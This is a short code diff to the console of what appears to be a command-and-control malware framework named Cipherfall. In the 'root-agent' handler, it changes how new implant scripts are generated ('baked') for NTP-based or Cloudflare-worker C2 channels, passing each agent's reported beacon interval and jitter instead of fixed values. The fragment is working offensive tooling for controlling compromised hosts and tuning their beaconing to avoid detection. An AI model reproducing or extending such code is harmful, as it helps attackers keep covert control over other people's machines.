@@ -1195,22 +1195,24 @@ class CipherfallTUI(App):
         if not info:
             log.write("[red]root-agent: agent not found in C2[/red]")
             return
-        sysinfo    = json.loads(info.get("sysinfo", "{}"))
-        worker_url = sysinfo.get("worker_url", "")
-        is_ntp     = worker_url.startswith("ntp://")
-        psk        = _DEFAULT_PSK or "changeme"
-        rtag       = uuid.uuid4().hex[:8]
+        sysinfo      = json.loads(info.get("sysinfo", "{}"))
+        worker_url   = sysinfo.get("worker_url", "")
+        is_ntp       = worker_url.startswith("ntp://")
+        b_int        = int(sysinfo.get("beacon_int",    30))
+        b_jitter     = int(sysinfo.get("beacon_jitter", max(1, b_int // 3)))
+        psk          = _DEFAULT_PSK or "changeme"
+        rtag         = uuid.uuid4().hex[:8]
         served_path: "pathlib.Path | None" = None
         try:
             if is_ntp:
                 m          = re.match(r"ntp://([^:]+)", worker_url)
                 c2_direct  = m.group(1) if m else ""
                 out_path   = await asyncio.to_thread(
-                    _bake_agent_ntp, psk, 30, 10, f"_root_{rtag}.py", 443, c2_direct
+                    _bake_agent_ntp, psk, b_int, b_jitter, f"_root_{rtag}.py", 443, c2_direct
                 )
             else:
                 out_path   = await asyncio.to_thread(
-                    _bake_agent_cloudflare, _DEFAULT_URL, psk, 30, 10, f"_root_{rtag}.py"
+                    _bake_agent_cloudflare, _DEFAULT_URL, psk, b_int, b_jitter, f"_root_{rtag}.py"
                 )
         except Exception as e:
             log.write(f"[red]root-agent: bake failed: {e}[/red]")
